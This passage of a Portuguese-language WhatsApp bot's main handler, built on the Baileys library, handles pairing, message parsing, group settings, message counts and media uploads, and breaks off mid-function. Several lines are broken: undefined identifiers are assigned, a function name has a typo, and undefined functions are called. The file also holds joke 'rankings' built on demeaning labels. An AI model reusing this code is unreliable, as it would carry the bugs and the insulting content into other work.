require("./dono.js")
const { 
default:
makeWASocket, 
downloadContentFromMessage,
generateWAMessageContent,
generateWAMessageFromContent,
makeCacheableSignalKeyStore,
StylePrivWaFromMessage,
delay,
useMultiFileAuthState,
BufferJSON,
proto,
close,
prepareWAMessageMedia, 
MediaType,
MessageType,
ChatModification,
DisconnectReason,
relayWAMessage,
fetchLatestBaileysVersion,
WASocket,
Browsers,
EyeWaSocket,
makeInMemoryStore,
}
= require('@whiskeysockets/baileys');
const webp_mp4 = require("./arquivos/lib/webp_mp4.js");
const { getRandom} = require('./arquivos/fun√ß√µes/myfunc.js');
const { exec } = require("child_process")
const totalcmd = "787"
const chalk = require('chalk');
const FileType = require('file-type')
const { runtime } = require("./arquivos/myfunc")
const color = (text, color) => { return !color ? chalk.green(text) : chalk.keyword(color)(text) };
let pino = require('pino')
const fs = require('fs')
const PhoneNumber = require('awesome-phonenumber')
const cfonts = require('cfonts')
const axios = require('axios');
const infoSystem = require('os')
const NodeCache = require('node-cache')
const readline = require('readline')
const util = require("util")
const path = require("path")
const fetch = require('node-fetch');
const speed = require('performance-now')
const moment = require('moment-timezone');
const ffmpeg = require('fluent-ffmpeg');
const mimetype = require("mime-types")
const BodyForm = require("form-data")
const { Boom }  = require('@hapi/boom');
const crypto = require('crypto');
const encodeUrl = require('encodeurl');
const cheerio = require('cheerio');
const { MultiDownload } = require('./arquivos/multidl.js');
const { getBuffer, getGroupAdmins,} = require('./datab/myfunc');
const { ytvdl, yts, ytadl, cleanup } = require("lordxdd");
const { emoji2 } = require ('./settings.json')
const registrar = JSON.parse(fs.readFileSync('./arquivos/registro/registros.json'));
// ‚Ä† by adm crician ü§°
const simih = JSON.parse(fs.readFileSync('./arquivos/usuarios/simi.json'));
const samih2 = JSON.parse(fs.readFileSync('./arquivos/fun√ß√µes/simi.json'));

const premium = JSON.parse(fs.readFileSync('./Premiums/usuarios/premium.json'));
const antiporn = JSON.parse(fs.readFileSync('./arquivos/antis/antiporn.json'));
const { conselhob } = require('./arquivos/fun√ß√µes/conselhob.js');
const modobn = JSON.parse(fs.readFileSync('./arquivos/grupos/brincadeiras.json'));
const antiflood = JSON.parse(fs.readFileSync('./arquivos/usuarios/antiflood.json'));
const limitefll = JSON.parse(fs.readFileSync('./arquivos/usuarios/flood.json'));
const registros = JSON.parse(fs.readFileSync('./arquivos/registro/registros.json'));
const antifake = JSON.parse(fs.readFileSync('./arquivos/antis/antifake.json'));
const nescessario = JSON.parse(fs.readFileSync('./arquivos/nescessario.json'));
const antisticker = JSON.parse(fs.readFileSync('./arquivos/antis/antisticker.json'))
const countMessage = JSON.parse(fs.readFileSync('./arquivos/grupos/countmsg.json'));
const antinotas = JSON.parse(fs.readFileSync('./arquivos/antis/antinotas.json'))
const antipv = JSON.parse(fs.readFileSync('./arquivos/usuarios/antipv.json'))
const adeuscara = JSON.parse(fs.readFileSync('./arquivos/grupos/adeuscara.json'));
const autoreact = JSON.parse(fs.readFileSync('./arquivos/fun√ß√µes/autoreact.json'))
const muted = JSON.parse(fs.readFileSync('./database/usuarios/muted.json'))

const { tabela } = require('./arquivos/grupos/tabela');
var { verificado } = require("./settings/nescessario.json")

const { 
getExtension, Random, 
getFileBuffer,
} = require("./loli/browser/get.js")

const API_KEY_SHIPPUDEN = "SHIPPUDEN"
const API_KEY_SHADOW = "apikey-do-flexa"
const API_KEY_SABRINA = "api-do_flexa"
const API_KEY_DANIEL = "daniel-api3"
const API_KEY_ZEROTWO = "key-_do_lucas-lima_";
const API_CARIFLEX = "cariflex-key"


const { fetchJson } = require('./arquivos/fun√ß√µes.js');

const { palavras } = require('./arquivos/lib/conselhos.js');

//‚Ä† Global donos  minhas
donoName = global.donoName
botName = global.botName
donoNumber = global.donoNumber
numeroBot = global.numeroBot
prefix = global.prefix
// 
function kyun(seconds){
function pad(s){ return (s < 10 ? '0' : '') + s;}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos` }
const convertBytes = function(bytes) {
const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
if (bytes == 0) {
return "n/a"
}
const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
if (i == 0) {
return bytes + " " + sizes[i]
}
return (bytes / Math.pow(1024, i)).toFixed(1) + " " + sizes[i]
}

//// DATA E HORA PIKEMON
data = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const msgRetryCounterCache = new NodeCache();


async function ligarbot() {
let phoneNumber = "5596991084987"
const store = makeInMemoryStore({ logger: pino().child({ level: 'debug', stream: 'store' }) })
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùòøùòºùôèùòº ùôÄ ùôÉùôäùôçùòº ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏

data = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const { state, saveCreds } = await useMultiFileAuthState('./datab/qr-code')
const { version, isLatest} = await fetchLatestBaileysVersion();
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùòæùôäùôâùôÄùôìùôäÃÉùôÄùôé ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
const amy = makeWASocket({
  logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode,
      mobile: useMobile,
      browser: ['Chrome (Linux)'],
     auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
      },
      browser: ['Chrome (Linux)', '', ''],
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      getMessage: async (key) => {
         let jid = jidNormalizedUser(key.remoteJid)
         let msg = await store.loadMessage(jid, key.id)

         return msg?.message || ""
      },
      msgRetryCounterCache,
      defaultQueryTimeoutMs: undefined,
   })
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùôÇùôÄùôçùòºùôç ùòæùôäÃÅùòøùôÑùôÇùôäùôé ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
if (pairingCode && !amy.authState.creds.registered) {
console.log(`${chalk.redBright("Coloque o n√∫mero de whatsapp. Exemplo: +5596991542453")}:`);
let phoneNumber = await question(`   ${chalk.cyan("- N√∫mero")}: `);
phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

let code = await amy.requestPairingCode(phoneNumber);
code = code?.match(/.{1,4}/g)?.join("-") || code;
console.log(` ü•∂ ${chalk.redBright("Seu c√≥digo")}:`);
console.log(`   ${chalk.cyan("- C√≥digo")}: ${code}`);
rl.close();
}

const banner = cfonts.render(("AMY|BOT"), {
font: "block",
align: "center",
colors: [`cyan`,`white`,`cyan`],
})

amy.ev.on('creds.update', saveCreds);
store.bind(amy.ev)
amy.ev.on("chats.set", () => {
console.log("Tem conversas", store.chats.all())
})
amy.ev.on("contacts.set", () => {
console.log("Tem contatos", Object.values(store.contacts))
})
amy.ev.on("connection.update", (update) => {
const { connection, lastDisconnect } = update
if(connection === "close") {
const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut
console.log("Conex√£o fechada devido a", lastDisconnect.error, "Tentando reconectar...", shouldReconnect);
if(shouldReconnect) {
startBase()
}
} else if(connection === "open") {
console.log(banner.string)
console.log(`${color(`${botName} AMY-BOT-V2 Conectada com sucesso ‚úì `,'cyan')}`)
}
})

amy.ev.on('contacts.set', () => {
console.log('setando contatos...')
})

amy.ev.on('creds.update', saveCreds)

amy.ev.on('messages.upsert', async ({ messages }) => {
try {
//=============fun√ß√µes
const info = m = messages[0]
if (!info.message) return 

const key = {
    remoteJid: info.key.remoteJid,
    id: info.key.id, 
    participant: info.key.participant 
}
await amy.readMessages([key])

if (info.key && info.key.remoteJid == 'status@broadcast') return
const altpdf = Object.keys(info.message)
const type = altpdf[0] == 'senderKeyDistributionMessage' ? altpdf[1] == 'messageContextInfo' ? altpdf[2] : altpdf[1] : altpdf[0]

type_message = JSON.stringify(info.message)

const isQuotedImage = type === "extendedTextMessage" && type_message.includes("imageMessage")
const from = m.chat = info.key.remoteJid

// Deletar Arquivos:
function DLT_FL(file) {
try {
fs.unlinkSync(file);
} catch (error) {
}
}
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùòΩùôêùòøùôî ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
////========
const budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var Procurar_String = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || ""

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùòΩùôäùòøùôî ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
var body = type === "conversation" ? info.message.conversation : type === "viewOnceMessageV2" ? info.message.viewOnceMessageV2.message.imageMessage ? info.message.viewOnceMessageV2.message.imageMessage.caption : info.message.viewOnceMessageV2.message.videoMessage.caption : type === "imageMessage" ? info.message.imageMessage.caption : type === "videoMessage" ? info.message.videoMessage.caption : type === "extendedTextMessage" ? info.message.extendedTextMessage.text : type === "viewOnceMessage" ? info.message.viewOnceMessage.message.videoMessage ? info.message.viewOnceMessage.message.videoMessage.caption : info.message.viewOnceMessage.message.imageMessage.caption : type === "documentWithCaptionMessage" ? info.message.documentWithCaptionMessage.message.documentMessage.caption : type === "buttonsMessage" ? info.message.buttonsMessage.imageMessage.caption : type === "buttonsResponseMessage" ? info.message.buttonsResponseMessage.selectedButtonId : type === "listResponseMessage" ? info.message.listResponseMessage.singleSelectReply.selectedRowId : type === "templateButtonReplyMessage" ? info.message.templateButtonReplyMessage.selectedId : type === "groupInviteMessage" ? info.message.groupInviteMessage.caption : type === "pollCreationMessageV3" ? info.message.pollCreationMessageV3 : type === "interactiveResponseMessage" ? JSON.parse(info.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : type === "text" ? info.text : ""           
////========
 
const content = JSON.stringify(info.message);
const isCmd = body.startsWith(prefix)

const isGroup = from.endsWith("@g.us")

const menc_jid2 = info.message?.extendedTextMessage?.contextInfo?.mentionedJid

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùôçùôÄùôâùòøùôÄùôç ùòøùôÄ ùôÖùôäùôÇùôä ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
gayzin = gayz√£o
fein = fei√£o 
matei = mateii
cornin = corn√£o
bonita = bonitinha 
gada = gadinha
vesgin = vesg√£o
bebin = beb√£o
gadin = gad√£o
gostosin = gostos√£o
gostosinha = gostosona 
hitler = nazista
tapinha = tap√£o
beijin = beij√£o
chutin = chut√£o
dancinha = dan√ßa 
casalzin = casar
fiel = fielzao
soquin = soc√£o 
infiel = infielzin
By = "AMY-BOT-V2"

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùôÅùôêùôâùòæÃßùôäÃÉùôÄùôé ùòøùôÄ ùôÇùôçùôêùôãùôä ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏



const dirGroup = `./arquivos/grupos/${from}.json`;

const nescj = "./dono/nescessario.json";

const data_IDGP = [{
groupId: from,
x9: false, 
antisticker: false,
antiloc: false,
antifake: false, 

Odelete: false, 
antispam: false, 
antinotas: false, 
sistemGold: false,
visuUnica: false, 
registrarFIGUS: false,
soadm: false,
rg_aluguel: false,
listanegra: [], 
advertir: [], 
prefixos: ["!"],
advertir2: [], 
legenda_estrangeiro: "0",
legenda_documento: "0",
 legenda_video: "0",
legenda_imagem: "0", 
multiprefix: false, 
forca_ofc: [{acertos: 0, erros: 0, palavra: [], escreveu: [], palavra_ofc: 0, dica: 0, tema: 0}],
minerar_gold: [], ausentes: [], forca_inc: false, 
antipalavrao: {
active: false,
palavras: []
},
limitec: {
active: false,
quantidade: null
},
wellcome: [{
bemvindo1: true,
legendabv: "Ol√° #numerodele#, seja bem vindo (a)",
legendasaiu: 0
},
{
bemvindo2: false,
legendabv: "Ol√° #numerodele#, seja bem vindo (a)",
legendasaiu: 0
}],
simih1: false, simi2: false,
autosticker: false, autoresposta: false,
jogos: false, level: false,
bangp: false, nsfw: false
}];

if(isGroup && !fs.existsSync(dirGroup)){
fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP, null, 2) + '\n');
}
try {
var dataGp = isGroup ? JSON.parse(fs.readFileSync(dirGroup)) : undefined;
} catch (e){
fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP));
}

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + '\n')}
function setNes(index){
fs.writeFileSync(nescj, JSON.stringify(index, null, 2))}

/////=================
const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
const sender = isGroup ? info.key.participant: from
const sendPoll = (jid, name = '', values = [], selectableCount = 1) => { 
amy.sendMessage(jid, { poll: { name, values, selectableCount }}) 
}
const command = comando = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null
const nome = pushName = info.pushName ? info.pushName: botName 
const pushname = info.pushName ? info.pushName : ""

const groupMetadata = isGroup ? await amy.groupMetadata(from): ""
const participants = isGroup ? await groupMetadata.participants : ''
const groupName = isGroup  ? groupMetadata.subject: ""
const groupDesc = isGroup ? groupMetadata.desc : ''
const isX9VisuUnica = isGroup ? dataGp[0].visuUnica : undefined
 const isx9 = isGroup ? dataGp[0].x9 : undefined

const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

const args = body.trim().split(/ +/).splice(1)
const q = text = args.join(' ')
const So_Adm = isGroup ? dataGp[0].soadm: undefined
const IS_sistemGold = isGroup ? dataGp[0].sistemGold : undefined
const criador = `${donoNumber}@s.whatsapp.net`
const numeroBot = amy.user.id.split(":")[0]+"@s.whatsapp.net"
const isCreator = criador.includes(sender)
const isAdmins = groupAdmins.includes(sender) || false 
const isBotAdmins = groupAdmins.includes(numeroBot) || false
const isPremium = premium.includes(sender)
const TOKEN_GPT = nescessario.TOKEN_GPT

const adivinha = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'iPhone' : 'WhatsApp Web';

    amy.sendImage = async (jid, path, caption = '', quoted = '', options) => {
	let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await amy.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
 
  
const cfonts = require("cfonts")
const chalk = require("chalk")
const axios = require("axios")
const fetch = require("node-fetch")
const mimetype = require("mime-types")
const FormData = require("form-data")
const { fromBuffer } = require("file-type")

var corzinhas = ["white"]
var corzinhas1 = ["red"]
var corzinhas2 = ["white"]
const cor1 = corzinhas[Math.floor(Math.random() * (corzinhas.length))]	
const cor2 = corzinhas1[Math.floor(Math.random() * (corzinhas1.length))]	
const cor3 = corzinhas2[Math.floor(Math.random() * (corzinhas2.length))]	




const getBuffer = (url, options) => new Promise(async (resolve, reject) => { 
options ? options : {}
await axios({method: "get", url, headers: {"DNT": 1, "Upgrade-Insecure-Request": 1}, ...options, responseType: "arraybuffer"}).then((res) => {
resolve(res.data)
}).catch(reject)
})



const getExtension = async (type) => {
	return await mimetype.extension(type)
}

const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`;
}

function upload(midia) {
  return new Promise(async (resolve, reject) => {
    try {
      let { ext } = await fromBuffer(midia);
      let form = new FormData();
      form.append('reqtype', 'fileupload');
      form.append('fileToUpload', midia, 'tmp.' + ext);

      await fetch('https://catbox.moe/user/api.php', {
        method: 'POST',
        body: form
      })
      .then(response => response.text())
      .then(link => {
        resolve(link.trim());
      })
      .catch(erro => reject(erro));
    } catch (erro) {
      return console.log(erro);
    }
  });
}




//********************************************//
const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./arquivos/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./arquivos/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./arquivos/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
function isRegistrado(id) {
    return registrar.some(usuario => usuario.id === id);
}
var { fundo1, fundo2, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, deathcmd, beijocmd, chutecmd, tapacmd, rnkgay, rnkgado, rnkcorno, rnkgostoso, rnkgostosa, rnknazista, rnkotaku, rnkpau, suruba, sococmd, espancarcmd, comercmd, paucmd, forcacmd, lavarcmd, rnkfreefire, farparcmd, rnkxitado, rnklacre, rnkfalido, rnkpunheteiro, minado_bomb, thumbnail } = require("./tznaftkk/links_img.json");
var { dono1 } = require("./settings/nescessario.json");
const numerodono = [`${dono1}@s.whatsapp.net`]
const { mensagens } = require('./arquivos/fun√ß√µes/aleatoria.js');

var texto_exato = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var replymen = mensagens[Math.floor(Math.random() * mensagens.length)] 

const texto = texto_exato.slice(0).trim().split(/ +/).shift().toLowerCase()

async function escrever (texto) {
await amy.sendPresenceUpdate('composing', from) 
await esperar(3000)   
amy.sendMessage(from, { text: texto }, {quoted: info})
}
const VRF_JSON_GRUPO = fs.existsSync(`./database/grupos/activation_gp/${from}.json`) ? true : false;

if(VRF_JSON_GRUPO) {
var jsonGp = JSON.parse(fs.readFileSync(`./database/grupos/activation_gp/${from}.json`));
}

if(VRF_JSON_GRUPO && jsonGp[0].x9 && info.messageStubType){
switch(info.messageStubType){
case 29:
await delay(1000);
amy.sendMessage(info.key.remoteJid, {text: `*@${info.messageStubParameters[0].split("@")[0]}* foi promovido(a) ao cargo de adminstrador do grupo por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 5000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
break;
case 30:
await delay(1000);
amy.sendMessage(info.key.remoteJid, {text: `O(a) adminstrador(a) *@${info.messageStubParameters[0].split("@")[0]}* foi rebaixado(a) √† membro comum por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 5000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
break;
}}

async function instagramDl(url) { // by hiudy
  const { instagram } = require("nayan-media-downloader");
  comsole.log(instagram)
  try {
    let URL = await instagram(url); 
    return {video: [...URL.data.video], foto: [...URL.data.images]};
  } catch (error) {
    console.error("Erro ao tentar baixar a m√≠dia do Instagram:", error);
    return [];
  }
}

async function iniciandoDown() {
  const carregamento = [
    `*üî• Carregando...*\n*„Ää ‚ù§Ô∏è‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã10%*`,
    `*üî• Carregando...*\n*„Ää üíõ‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã20%*`,
    `*üî• Carregando...*\n*„Ää üíô‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí„Äã40%*`,
    `*üî• Carregando...*\n*„Ää üíú‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí„Äã50%*`,
    `*üî• Carregando...*\n*„Ää üíö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí„Äã70%*`,
    `*üî• Carregando...*\n*„Ää üíñ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí„Äã80%*`,
    `*üî• Carregando...*\n*„Ää ‚ù§Ô∏è‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà„Äã90%*`,
    `*üíñ CARREGAMENTO COMPLETO!* üíñ`,
  ];

  const { key } = await amy.sendMessage(from, {
    text: 'üî• INICIANDO CARREGAMENTO... üî•',
  });

  for (let i = 0; i < carregamento.length; i++) {
    await amy.sendMessage(from, {
      text: carregamento[i],
      edit: key,
    });
    await new Promise((resolve) => setTimeout(resolve, 2000));
  }
}

async function iniciando2Down() {
var carregamento = [
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã10%*`,
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã20%*`,
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äã40%*`,
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí„Äã50%*`,
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí„Äã70%*`,
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí„Äã80%*`,
` *ùë©ùë®ùë∞ùëøùë®ùëµùë´ùë∂ ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫...*\n*„Ää ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí„Äã90%*`,
`  üé® ùë∞ùë¥ùë®ùëÆùë¨ùëµùë∫ ùë©ùë®ùë∞ùëøùë®ùë´ùë®ùë∫ üé®
`
] 
let { key } = await amy.sendMessage(from, {text: 'ùë∞ùëµùë∞ùë™ùë∞ùë®ùëµùë´ùë∂ ùë´ùë∂ùëæùëµùë≥ùë∂ùë®ùë´ùë∫'})

for (let i = 0; i < carregamento.length; i++) {
await amy.sendMessage(from, {text: carregamento[i], edit: key });
}
}

async function baixarDown() {
var download = [
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äô0%`,
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äô10%`,
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí„Äô35%`,
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí„Äô51%`,
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí„Äô62%`,
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí„Äô80%`,
`‚ñß‚ÉØ‚Éüùô¥ùöóùöüùöíùöäùöóùöçùöò ùöÇùöûùöä ùôº√∫ùöúùöíùöåùöäÕò‡∏∫.‚Ä¢üõ∏ ›á›à‚îÄ
 ü·¥è·¥Ä·¥Ö…™…¥…¢„Äò‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà„Äô100%`,
`~_*¬© ùô∞ùöñùö¢ ùöãùöòùöù ùöòùöèùöíùöåùöíùöäùöï*_~
ùôªùôæùô∞ùô≥ùô∏ùôΩùô∂ ùô≤ùôæùôºùôøùôªùô¥ùöÉùô¥ùô≥...`
]
let { key } = await amy.sendMessage(from, {text: `\`\`\`üîé buscando m√∫sica üîç\`\`\``})

for (let i = 0; i < download.length; i++) {
await amy.sendMessage(from, {text: download[i], edit: key });
}
}

async function FOTOPLAY() {
try {
var cricianfoto = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image');
} catch(e) {
cricianfoto = 'https://telegra.ph/file/b5d494f35df464680649c.jpg';
}
}


async function askQuestion(from, pergunta, opcoes) {
  const mensagem = await amy.sendMessage(from, {text: pergunta}, {quoted: info})
  const botao = []
  for (let i = 0; i < opcoes.length; i++) {
    botao.push({text: opcoes[i], command: `${prefix}opcao ${i+1}`})
  }
  const buttonMessage = {
    text: pergunta,
    footer: 'Selecione uma op√ß√£o',
    buttons: botao,
    headerType: 1
  }
  await amy.sendMessage(from, buttonMessage, {quoted: mensagem}).catch(e => { reagir(from, "‚ùå") })

